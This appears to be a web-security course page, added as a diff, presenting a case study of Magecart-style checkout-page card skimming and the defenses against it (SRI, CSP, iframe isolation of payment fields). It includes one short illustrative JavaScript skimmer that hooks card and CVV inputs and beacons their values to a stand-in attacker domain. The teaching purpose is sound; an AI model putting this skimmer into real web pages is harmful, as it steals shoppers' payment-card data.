@@ -1,0 +1,92 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Case Study — Magecart / Web Skimming (2014–)</title>
+<link rel="stylesheet" href="../../assets/lab.css">
+<link rel="stylesheet" href="../../module_16_cases/module.css">
+</head>
+<body>
+<nav class="nav">
+  <a href="/">◂ Lab home</a>
+  <a href="../../module_16_cases/">◂ Module 16 index</a>
+</nav>
+
+<p class="kicker">Module 16 · Case Study</p>
+<h1>Magecart — Client-Side Card Skimming</h1>
+<p class="lead">Not a single incident but a technique used by many groups:
+inject JavaScript into a checkout page so it silently copies payment-card fields
+and exfiltrates them as the victim types. XSS/script-injection weaponized purely
+for data theft.</p>
+
+<h2>The technique</h2>
+<p>Magecart-style skimmers get attacker JavaScript to run on a checkout page —
+via a stored XSS, a compromised first-party script, or (most famously) a
+<strong>compromised third-party dependency</strong> loaded by the page. Once
+running same-origin on the payment form, the skimmer:</p>
+<ol>
+<li>Hooks the card-number / CVV / expiry inputs (event listeners on
+<code>input</code>/<code>change</code>, or a <code>submit</code> handler).</li>
+<li>Reads the values as the victim types them.</li>
+<li>Exfiltrates to an attacker domain via an image beacon,
+<code>fetch</code>, or <code>navigator.sendBeacon</code> — often to a domain
+whose name mimics a CDN to evade notice.</li>
+</ol>
+<pre><code>// shape of a skimmer (illustrative)
+document.querySelectorAll('input[name*=card],input[name*=cvv]').forEach(el=>{
+  el.addEventListener('change', e=>{
+    navigator.sendBeacon('https://cdn-analytics[.]evil/collect',
+      JSON.stringify({f:e.target.name, v:e.target.value}));
+  });
+});</code></pre>
+
+<h2>Mapping to the taxonomy</h2>
+<table>
+<thead><tr><th>Element</th><th>Course concept</th></tr></thead>
+<tbody>
+<tr><td>Attacker JS runs same-origin on checkout</td><td>Any mechanism 1–5, or a supply-chain script inclusion</td></tr>
+<tr><td>Reads form fields as typed</td><td>M15: same-origin trust → full DOM access</td></tr>
+<tr><td>Beacon to attacker host</td><td>M11 out-of-band exfiltration</td></tr>
+<tr><td>Third-party script as entry</td><td>Supply-chain: the page trusts an external script it doesn't control</td></tr>
+</tbody>
+</table>
+
+<h2>Why it's a different threat shape than a worm</h2>
+<p>Samy/Twitter were about <em>propagation</em>. Magecart is about <em>silent,
+persistent exfiltration</em>: there is no alert, no defacement, nothing the victim
+or often the merchant notices for weeks or months. This is the real-world form of
+Module 11's blind/OOB idea — the payload's whole job is to phone home quietly.</p>
+
+<h2>The absent / bypassed defenses</h2>
+<div class="card">
+<ul>
+<li><strong>Subresource Integrity (SRI)</strong> on third-party scripts — a
+<code>&lt;script integrity=...&gt;</code> hash makes a tampered dependency fail to
+load. Missing SRI is the classic enabler of the supply-chain variant.</li>
+<li><strong>CSP <code>connect-src</code>/<code>img-src</code>/<code>default-src</code></strong>
+restricting where the page may send data — blocks the exfiltration beacon to an
+unknown host. A well-scoped CSP is the single most effective containment.</li>
+<li><strong>Payment-field isolation:</strong> render card fields inside a
+PCI-compliant iframe from a <em>different origin</em> (hosted fields / a payment
+iframe), so first-party script — malicious or not — literally cannot read them
+(Same-Origin Policy working <em>for</em> you).</li>
+<li><strong>Prevent the initial XSS / lock down dependencies</strong> (pin
+versions, review, monitor script integrity at runtime).</li>
+</ul>
+</div>
+
+<h2>Lesson for defenders</h2>
+<p>Magecart is why a modern XSS defense must think about <strong>data
+egress</strong>, not only script execution. Even a page that "only" allows a
+trusted-looking script can bleed card data if nothing constrains
+<em>where the page may talk</em>. It also elevates <strong>architecture</strong>
+(iframe isolation of secrets) alongside encoding and CSP — a theme your Module 18
+threat model should treat as first-class: <em>assume script may run; make the
+secrets unreachable and the exfil path closed.</em></p>
+
+<footer>
+Module 16 · <a href="../../module_16_cases/case_studies/ba_breach.html">Next case: British Airways 2018 ▸</a>
+</footer>
+</body>
+</html>
